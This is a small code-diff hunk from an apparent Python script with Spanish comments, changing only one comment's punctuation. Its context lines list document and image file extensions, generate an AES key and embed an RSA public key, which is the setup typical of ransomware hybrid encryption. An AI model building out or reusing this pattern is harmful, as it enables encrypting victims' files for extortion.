@@ -93,7 +93,7 @@ extensions = ['.docx', '.xlsx', '.pdf', '.jpeg', '.jpg', '.txt']
 # Generar clave AES
 clave_aes = generar_clave_aes()
 
-# Llave pública proporcionada (en formato PKCS#8)
+# Llave pública proporcionada (en formato PKCS#8).
 public_key_pem = '''-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAk9c8fM3oEyNAWNylkTei
 Xe0U1GTDqgUCrjOCkoweLpnZr9JihFS888GbJiy+V7WqmFGO20tjsnRLFtgKveVa
